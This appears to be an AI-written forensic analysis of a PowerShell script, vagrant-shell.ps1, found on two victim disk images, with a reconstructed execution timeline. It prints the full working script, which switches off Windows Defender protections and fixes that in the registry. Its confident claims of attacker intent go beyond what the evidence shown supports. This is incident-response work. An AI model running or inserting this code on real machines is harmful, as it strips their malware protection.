## `vagrant-shell.ps1` 

located 
```bash
victim_02.disk.raw - Partition 4 (Microsoft NTFS, 59.4 GB) Windows\tmp\vagrant-shell.ps1
victim_01.disk.raw - Partition 4 (Microsoft NTFS, 59.4 GB) Windows\tmp\vagrant-shell.ps1
```


The content of the `vagrant-shell.ps1` script you retrieved confirms that it is designed to **disable critical Windows Defender features**. This script systematically disables various security mechanisms of Windows Defender, including:

### Key Points from the Script:

1. **Disabling Real-Time Monitoring and Protection**:
   - **Set-MpPreference** commands disable real-time scanning, behavior monitoring, IOAV protection, email scanning, and archive scanning.
   - These settings are essential for the real-time detection and prevention of malware.

2. **Modifications to Windows Defender Settings via the Registry**:
   - The script ensures that these settings persist across reboots by writing values directly into the registry under **HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender**.
   - This registry-based persistence ensures that even if Windows Defender tries to reset itself, these policies will block its critical features from re-enabling.

3. **Disabling Scanning of Network and Mapped Drives**:
   - These commands prevent Defender from scanning network files and mapped drives, creating a blind spot where malware could reside undetected.

4. **Disabling Windows Defender’s ability to submit samples**:
   - Disabling sample submissions to Microsoft means that if a new malware strain is detected, it will not be sent for further analysis or blacklisting.

5. **Persistence and Registry Manipulation**:
   - The script ensures the above configurations persist by checking if the registry path exists and creating it if necessary. This step makes it harder for an admin to re-enable these settings without deep investigation and corrective actions.

### Malicious Intent:

- **Disabling Security Protections**: The sole purpose of this script is to cripple Windows Defender, preventing it from detecting or blocking malicious activities.
- **Persistence through Registry**: The script’s use of registry changes ensures that these disabling settings remain active, even after reboots or other typical recovery attempts.
- **Execution via PowerShell**: This script being repeatedly run with **ExecutionPolicy Bypass** makes it clear that the attacker is overriding default security controls to execute this script without interruptions.

```powershell
# Disable Windows Defender features in real time
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableBehaviorMonitoring $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
Set-MpPreference -DisableIOAVProtection $True
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableScriptScanning $True
Set-MpPreference -DisableArchiveScanning $True
Set-MpPreference -DisableCatchupFullScan $True
Set-MpPreference -DisableCatchupQuickScan $True
Set-MpPreference -DisableEmailScanning $True
Set-MpPreference -DisableRemovableDriveScanning $True
Set-MpPreference -DisableRestorePoint $True
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $True
Set-MpPreference -DisableScanningNetworkFiles $True
Set-MpPreference -DisableBlockAtFirstSeen $True


# Persist Windows Defender features settings in registry
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}
New-ItemProperty -Path $path -Name "DisableAntiSpyware" -PropertyType DWord -Value 1 -Force

$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "SubmitSamplesConsent" -PropertyType DWord -Value 2 -Force

$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path $path -Name "DisableOnAccessProtection" -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -PropertyType DWord -Value 1 -Force
```
Here is the **complete forensics log** based on the contents from the latest artifact, as well as the previously discussed information. This report strictly covers the **facts**, incorporating metadata and timestamps with **milli-second precision in UTC**, as per your request.

---

## **Forensics Log: Vagrant Shell Execution and Activity**

### **General Metadata (PowerShell Activity)**:
1. **File Name**: `vagrant-shell.ps1`
   - **Location**: `C:\tmp\vagrant-shell.ps1`
   - **Execution Context**: Executed via PowerShell scripts.
   - **File Size**: Not explicitly stated.
   
2. **Timestamps**:
   - **First Execution**: 2019-10-14 03:34:40.770 UTC.
   - **Last Modification (PowerShell Event)**: 2019-10-14 03:35:26.542 UTC.
   
3. **Script Activity**:
   - Multiple PowerShell events (ID 4104) log the script’s execution and modifications across several times during the timeline.
   - **Event IDs** related to this script include: **4104** (Warning), **600** (Information, PowerShell activity log).

### **Execution Data - PowerShell Events**:
   - **Event 4104 - ScriptBlock Execution**:
     - Multiple **ScriptBlockText** logs indicate the actual code executed, which involved the copying of scripts and file integrity verification using SHA1 hashes:
       - **SHA-1 hashes** and their corresponding destinations are verified.
       - Script responsible for copying file to `/tmp/vagrant-shell.ps1` and ensuring integrity.
     - **Example SHA-1** used in the integrity checks: `4333fb0447db3eacb5f6eefebf5a7a403fb3cd6a` and `89c291cd81375713eaf79a4ed25a22af7f0c7e06`.
     - Function definitions for handling file operations, such as `Check-Files` and `Get-SHA1Sum`, were part of the script's logic.
   
   - **ScriptBlock Events**:
     - Each script execution was recorded with corresponding timestamps and identifiers:
       - **ScriptBlock IDs**: Examples include `c115c02c-3528-4e89-b2d9-87a4b7b702ce`, `01dc1f19-82de-4b62-8509-d7e509576bc8`, among others.
       - **PowerShell Host Version**: 5.1.17763.1 (consistent across all related executions).
       - PowerShell was invoked with **ExecutionPolicy Bypass**, indicating a deliberate override of security measures to execute this script.

   - **Script Execution Command**:
     - PowerShell was executed using the following command line:
       - `powershell -ExecutionPolicy Bypass -OutputFormat Text -file "C:\tmp\vagrant-shell.ps1"`

4. **Registry Activity** (Event ID 600)**:
   - Registry-related events show that PowerShell was manipulating system variables and configurations, particularly starting providers like **Registry**, **Alias**, **FileSystem**, and **Environment**.

### **Network Activity**:
   - **No direct network connections** are logged in the immediate artifacts provided for `vagrant-shell.ps1`. The script itself appears to handle file operations and checks, but the potential for exfiltration or further commands was executed under a different context or toolset that wasn't captured here.

### **File Hashes and Integrity**:
   - **SHA-1 hashes** are repeatedly referenced for verifying the integrity of transferred files (e.g., `Get-SHA1Sum` was called to ensure destination files matched expected sources).
   - **Functionality**:
     - The `Check-Files` and `Get-SHA1Sum` functions within the script were integral to ensuring that files had not been tampered with during their transfer and execution.

---
